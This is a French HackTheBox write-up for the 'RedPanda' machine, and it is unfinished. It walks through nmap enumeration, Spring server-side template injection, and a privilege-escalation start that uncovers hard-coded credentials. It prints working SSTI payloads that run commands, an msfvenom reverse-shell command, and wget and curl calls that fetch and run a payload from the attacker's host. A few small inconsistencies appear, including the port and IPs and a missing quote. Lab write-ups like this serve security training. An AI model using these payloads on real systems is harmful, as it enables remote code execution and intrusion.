---
title:  "HacktheBox WriteUp : RedPanda"
category: HackTheBox
tag: writeups
---
RedPanda est une machine pour débutants basée sur une plateforme Linux.  
Niveau : Facile

## 1 - Enumeration Nmap

`sudo nmap 10.10.11.170/24`

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 20:15 CET<>`
Nmap scan report for 10.10.11.170
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```
On voit que parmi les services disponible, un serveur web est actif sur le port 80.

## 2 - Enumeration Web
Après Exploration du site, on tombe sur une barre de recherche.
![RedPandaSearch](/assets/images/WriteUps/HackTheBox/redPanda/injection1.png){: width="500" style="display: block; margin: 0 auto"}

Celle-ci nous permet de trouver des utilisateurs qui ont un profil sur le site.
![redPandaProfil](/assets/images/WriteUps/HackTheBox/redPanda/injection2.png){: width="500" style="display: block; margin: 0 auto"}

### 2.1 - Découverte de SSTI (Server side template injection)

Puisque la page du profil de Greg nous parlait d'injection, on fait quelques tests.
Après quelques tests de type d'injections classiques (Sql, Xpath, ...).
On tombe sur une injection SSTI qui fonctionne avec `*{7*7}`.

![SSTIFinding](/assets/images/WriteUps/HackTheBox/redPanda/injection3.png){: width="500" style="display: block; margin: 0 auto"}

On sait maintenant de quel type d'injection il s'agit.

### 2.2 - Identification du framework

Maintenant qu'on sait qu'il s'agit d'une injection de template, il s'agirait d'identifier lequel.
Parmi toutes les commandes testées pour la SSTI, `*{7*'7'}` a donné un `Whitelabel Error Page`.  

![templateIdentif](/assets/images/WriteUps/HackTheBox/redPanda/framework.png){: width="500" style="display: block; margin: 0 auto"}


Après quelques recherches sur google, on tombe sur le site [spring template](https://zetcode.com/springboot/whitelabelerror/), nous indiquant qu'il s'agit du template Spring, un framework populaire pour les applications java.   
On trouve sur [Hacktrics](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) la commande 
``` 
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())
```
utilisée pour ce framework. 

### 2.3 - Etablissement d'un serveur http et connection
On peut maintenant exécuter des requêtes à distance à partir de la barre de recherche.
On instancie un serveur http sur notre kali.

![httpServeur](/assets/images/WriteUps/HackTheBox/redPanda/createServer.png){: width="500" style="display: block; margin: 0 auto"}


Nous testons l'accessibilité de notre serveur web (10.10.11.168) depuis le serveur web de la box (10.10.11.170)
à partir de la barre de recherchee.
Requête : 
```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('curl 10.10.11.168').getInputStream())}
```   
Reponse du serveur : 
![serveurRes](/assets/images/WriteUps/HackTheBox/redPanda/serverResponse.png){: width="500" style="display: block; margin: 0 auto"}


### 2.4 - ReverseShell
- Nous utilisons msfvenom pour générer un reverse shell en direction de notre serveur web (10.10.14.103):  
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.103 LPORT=443 -f elf > blabla.elf
```  
- Nous déplaçons le reverseShell (blabla.elf) dans le dossier depuis lequel nous exécutons notre serveur web.
- Nous exécutons un netcat sur le port 443 (sur la kali) afin d'accueillir la futur connection du reverse shell.  
- Depuis la machine cible (donc sur la barre de recherche), nous exécutons un wget de blabla.elf et l'exécutons afin de se connecter au netcat en écoute.

Après cela, nous faisons en sorte d'avoir un "meilleur shell" (voir [référence](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)) et de récupérer le flag user qui
est présent sur le répertoire courant.

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(wget  10.10.14.168/blabla.elf').getInputStream())}
```

![netcatKali](/assets/images/WriteUps/HackTheBox/redPanda/flagUser.png){: width="500" style="display: block; margin: 0 auto"}

## Élévation de privilèges

Nous utilisons l'outil [pspy64s](https://github.com/DominicBreuker/pspy) pour regarder les processus qui tournent sur la machine.
```
woodenk@redpanda:/home/woodenk$ cd /tmp
woodenk@redpanda:/tmp$ wget 10.10.14.103/pspy64s
woodenk@redpanda:/tmp$ chmod +x ./pspy64s
woodenk@redpanda:/tmp$ ./pspy64
```

Nous voyons un jar, que nous récupérons sur notre kali (en utilisant un serveur web sur /tmp sur la machine cible).

 <img src="/assets/images/WriteUps/HackTheBox/redPanda/jarcredits.png" width="1200px" height="600px"/>
Nous pouvons ouvrir le jar avec [jd-gui](http://java-decompiler.github.io/)

En recherchant dans les fichiers, on trouve un fichier "/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java"
qui contient des identifiants qui sont utilisables en ssh :  

<img src="/assets/images/WriteUps/HackTheBox/redPanda/passwordMainController.png" width="1200px" height="600px"/>

À continuer ...

## Références
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
- https://github.com/DominicBreuker/pspy
- http://java-decompiler.github.io/
